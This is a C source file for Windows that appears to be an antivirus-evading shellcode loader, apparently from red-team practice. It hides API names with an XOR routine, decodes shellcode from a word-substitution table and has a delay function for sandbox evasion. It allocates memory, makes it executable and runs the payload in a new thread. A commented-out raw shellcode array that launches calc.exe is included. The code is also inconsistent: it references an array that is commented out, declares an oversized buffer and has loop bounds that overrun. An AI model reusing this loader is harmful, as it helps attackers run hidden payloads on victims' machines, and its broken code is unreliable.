#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <psapi.h>
#include <time.h>


void DeepDream(int * num2) {
	int num1, flag_var, i, j, delta;
	int ctr;
	num1 = 1;
	delta = 1;
	//num2 = 1000000;
	time_t t;   // not a primitive datatype
    time(&t);
    //printf("\nStarting prime factorization at: %s", ctime(&t));
	
	for(i=num1+1; i<num2; ++i)
	{
	flag_var=0;
	for(j=2; j<=i/2; ++j)
	{
		if(i%j==0)
		{
			flag_var=1;
			break;
		}
	}
	if(flag_var==0)
		delta += 1;
		Sleep(1);
		//printf("%d\n",i);
	}
	time(&t);
    //printf("\nEnding prime factorization at: %s", ctime(&t));
}

void TotesMaGoats(char * ciphertext, size_t ciphertext_len, char * key, size_t key_len) {
	int myByte;
	//int k;
	//int l;
	//int m;
	
	myByte = 0;
	for (int idx = 0;  idx < ciphertext_len; idx++) {
		int k_minus_one = key_len - 1;
		//l = 1;
		//m = 0;
		if (myByte == k_minus_one) myByte = 0;
		//m = k + l;

		ciphertext[idx] = ciphertext[idx] ^ key[myByte];
		//l = m + k;
		myByte++;	
	}
}


int main(void) {

/*
unsigned char translation_table[][256] = { "slide","issue","works","steps","james","actor","craft","whale","argue","sizes","gives","viral","stock","stone","goals","racks","swing","shops","newer","scale","upper","ranks","stand","nancy","theme","dealt","whore","trick","derek","brake","oscar","rhode","devel","forty","omaha","proof","lemon","cited","flour","cisco","utils","boost","rebel","shaft","charm","delta","cindy","knows","width","rural","shape","nodes","queen","outer","canon","diary","trash","tears","shame","fifth","print","joint","cents","alien","toner","armed","roses","kenny","every","laugh","maria","drama","costs","clean","milan","honda","offer","beach","climb","words","billy","stack","roads","sbjct","stuff","until","smart","great","noted","diffs","arrow","break","shirt","verde","idaho","basis","cliff","point","bones","samoa","julie","souls","crops","crazy","haiti","screw","large","moore","chair","claim","plain","sagem","times","slots","dodge","stays","lived","risks","jacob","posts","lines","roger","rider","stamp","colon","emacs","belle","judge","sides","feeds","singh","squad","crowd","think","exact","aware","empty","saint","alike","daily","owned","names","civic","carry","those","genre","sugar","lying","specs","thats","final","meyer","buddy","known","magic","wrist","fatty","whole","bunch","haven","larry","wound","title","awful","keith","beads","paper","dolls","toxic","often","facts","spent","sight","seats","depth","match","added","along","jewel","blast","drums","enter","irish","input","stage","older","entry","dylan","index","sheer","shoot","lease","teach","ranch","array","bench","refer","perry","float","early","fuzzy","range","crack","snake","moves","batch","rates","areas","scope","jokes","leads","admit","yeast","grove","cache","glory","smell","draws","menus","labor","jesus","scuba","owner","yield","yacht","newly","badly","glass","fixed","apnic","annie","verse","naval","press","loves","indie","watch","coach","remix","jeans","dress","congo","spies","blood","death","fears","myers","acute","mills","fonts","cards","start","tahoe","ideal","fifty","bobby" };
unsigned char translated_shellcode[][287] = { "tahoe","costs","squad","fixed","dress","naval","teach","slide","slide","slide","armed","stack","armed","billy","roads","stack","smart","costs","rural","leads","souls","costs","daily","roads","cliff","costs","daily","roads","theme","costs","daily","roads","devel","costs","daily","dodge","billy","costs","racks","input","milan","milan","beach","rural","range","costs","rural","teach","sight","print","point","colon","works","charm","devel","armed","ranch","range","stone","armed","issue","ranch","badly","coach","roads","armed","stack","costs","daily","roads","devel","daily","roses","print","costs","issue","scope","daily","sides","empty","slide","slide","slide","costs","think","teach","lived","crazy","costs","issue","scope","billy","daily","costs","theme","every","daily","toner","devel","clean","issue","scope","glass","smart","costs","bobby","range","armed","daily","queen","empty","costs","issue","cache","beach","rural","range","costs","rural","teach","sight","armed","ranch","range","stone","armed","issue","ranch","trash","yacht","risks","congo","offer","steps","offer","lemon","argue","laugh","tears","jokes","risks","smell","noted","every","daily","toner","lemon","clean","issue","scope","crops","armed","daily","stock","costs","every","daily","toner","derek","clean","issue","scope","armed","daily","james","empty","costs","issue","scope","armed","noted","armed","noted","idaho","diffs","arrow","armed","noted","armed","diffs","armed","arrow","costs","squad","watch","devel","armed","roads","bobby","yacht","noted","armed","diffs","arrow","costs","daily","newer","press","great","bobby","bobby","bobby","verde","costs","entry","issue","slide","slide","slide","slide","slide","slide","slide","costs","names","names","issue","issue","slide","slide","armed","entry","rural","daily","sagem","aware","bobby","grove","dylan","dress","enter","title","smart","armed","entry","paper","thats","sheer","whole","bobby","grove","costs","squad","refer","utils","print","craft","colon","gives","sides","start","yacht","risks","actor","dylan","drama","scale","dodge","sagem","large","slide","diffs","armed","saint","menus","bobby","grove","samoa","claim","julie","cindy","souls","lines","souls","devel","knows","samoa","devel","samoa","point","chair","samoa","cindy","souls","lines","souls","slide" };
	unsigned char shellcode[287];
*/
unsigned char translation_table[][256] = { "dg","ot","nq","ty","cb","cj","vt","ta","xw","ei","rx","in","wu","rc","su","er","md","k","ic","hn","mw","ym","gv","ph","fn","xt","di","kg","x","vq","dr","as","em","hb","qv","zr","e","zx","gl","fq","ff","sz","ae","hd","kw","je","yo","rl","uo","og","nt","zp","ke","ki","xc","es","ik","yn","mh","qi","bl","ax","dz","b","rk","mv","va","gy","qc","mk","wp","ye","rp","fw","zk","gx","qh","fl","sr","dl","de","at","oz","vk","jq","tc","y","sh","kt","qk","gf","lq","of","hf","ti","cs","eo","gt","nn","aa","i","kn","nv","im","eq","jr","pa","np","pd","wj","ux","sy","hc","df","mp","mn","dv","ud","it","lf","gz","aq","ol","sk","hl","ku","sq","kf","kj","ne","gb","ip","mg","pc","bs","lg","rf","ha","co","ng","on","tq","tm","za","pp","ka","ew","hy","ef","sm","hk","jp","vx","nw","os","xy","ih","vd","bp","oa","cc","pm","qz","fk","p","fg","ko","ug","nh","ua","id","ft","eh","wy","qe","vs","mj","gk","qr","fr","lt","hj","xx","uw","pf","uf","po","jg","kq","bf","qp","yc","en","yj","cm","ja","ec","wa","uu","hr","gr","js","li","hx","gu","xe","kr","yp","tv","gn","am","vl","bj","kv","ps","qm","ia","aw","bo","wq","nx","la","iq","ov","pq","ej","yl","cq","dk","ar","om","km","qg","dp","ww","wk","lo","ll","qt","rm","nm","ap","oq","bc","dh","ig","yb","tx","hp","vc","ob","ul","hi","fm","cy","mz" };

unsigned char shellcode[265731];


	for (int sc_index = 0; sc_index <= 287; sc_index++) {
		for (int tt_index = 0; tt_index <= 255; tt_index++) {
			if (strcmp(translation_table[tt_index], translated_shellcode[sc_index]) == 0) {
				printf("translated_shellcode: %s\n", translated_shellcode[sc_index]);
				printf("translation table entry: %d\n", tt_index);
				printf("Shellcode byte: %x\n", translated_shellcode[sc_index]);
				shellcode[sc_index] = tt_index;
				break;
			}
		}
	}
	
	//unsigned char shellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
	int sc_len = sizeof(shellcode);

	//printf("[-] Beginning program execution\n");
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD op = 0;
	
    char xorkey[] = "R3dS13g3";
    char sCreateThread[] = { 0x11, 0x41, 0x1, 0x32, 0x45, 0x56, 0x33, 0x5b, 0x20, 0x56, 0x5, 0x37, 0x00 };
	char sVirtualAlloc[] = { 0x4, 0x5a, 0x16, 0x27, 0x44, 0x52, 0xb, 0x72, 0x3e, 0x5f, 0xb, 0x30, 0x00 };
	char sVP[] = { 0x4, 0x5a, 0x16, 0x27, 0x44, 0x52, 0xb, 0x63, 0x20, 0x5c, 0x10, 0x36, 0x52, 0x47, 0x00 };
    char sK32[] = { 0x39, 0x56, 0x16, 0x3d, 0x54, 0x5f, 0x54, 0x1, 0x7c, 0x57, 0x8, 0x3f, 0x00 };
	
	//printf("[-] Decrypting strings\n");
	TotesMaGoats((char *) sCreateThread, strlen(sCreateThread), xorkey, sizeof(xorkey));
	TotesMaGoats((char *) sVirtualAlloc, strlen(sVirtualAlloc), xorkey, sizeof(xorkey));
	TotesMaGoats((char *) sVP, strlen(sVP),xorkey, sizeof(xorkey));
    TotesMaGoats((char *) sK32, strlen(sK32), xorkey, sizeof(xorkey));

	//printf("[-] Resolving addresses\n");
	// Resolve the address of CreateThread
    FARPROC pCreateThread = GetProcAddress(GetModuleHandle(sK32), sCreateThread);
	FARPROC pVirtualAlloc = GetProcAddress(GetModuleHandle(sK32), sVirtualAlloc);
	FARPROC pVirtualProtect = GetProcAddress(GetModuleHandle(sK32), sVP);
	
	//char AESkey[] = { 0x9c, 0x5e, 0x86, 0x42, 0x29, 0xf, 0x4f, 0xf7, 0xa6, 0xb2, 0x3a, 0x50, 0xf8, 0xa9, 0xa0, 0x6e };
	//char AESkey[] = { 0xe3, 0xef, 0x25, 0x73, 0x5, 0x12, 0x2d, 0x3, 0xe1, 0x8e, 0x56, 0x1e, 0x1e, 0x28, 0xa2, 0xcb };
	// Decrypt payload
	//AESDecrypt((char *) calc_payload, calc_len, AESkey, sizeof(AESkey));


	//printf("[-] Allocating memory\n");	
	// Allocate buffer for payload
	exec_mem = pVirtualAlloc(0, 195, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "shellcode addr", (void *)shellcode);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);



	//TotesMaGoats((char *) calc_payload, calc_len, xorkey, sizeof(xorkey));
	//printf("[-] Copying shellcode\n");
	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, shellcode, sc_len);
	
	//printf("\nHit me!\n");
	//getchar();

	//printf("[-] Making buffer executable\n");
	//printf("[-] Making buffer executable\n");
	// Make the buffer executable
	//rv = pixel(exec_mem, calc_len, PAGE_EXECUTE_READ, &op);
	//rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &op);
	rv = pVirtualProtect(exec_mem, sc_len, PAGE_EXECUTE_READ, &op);

	printf("\nHit me!\n");
	getchar();
	//DeepDream(500);
	printf("[-] Executing thread\n");

	// If all good, run the payload
	if ( rv != 0 ) {
			th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}




	
	//unsigned int tt_len = 0;
	//unsigned int sc_len = 0;

	//tt_len = sizeof(translation_table);
	//sc_len = sizeof(shellcode);
	
	//printf("translation_table length: %d\n", tt_len);
	//printf(translation_table[0]);
	/*for (int tt_idx = 0; tt_idx <= 257; tt_idx++) {
		printf("tt_idx: %d, tt_entry: %s\n", tt_idx,translation_table[tt_idx]);
		//printf("tt entry: %s\n", translation_table[tt_idx]);
	}*/
	//int index = -1;
	/*for (int index = 0; index <= 256; index++) {
		if (strcmp(translation_table[index], "mixed") == 0) {
			translated_shellcode[i] = i;
			break;
		}
	}*/
	
	
	
	//printf("Index of shops is: %d\n", index);
	//printf("shelcode length: %d\n", sc_len);

	
	return 0;
}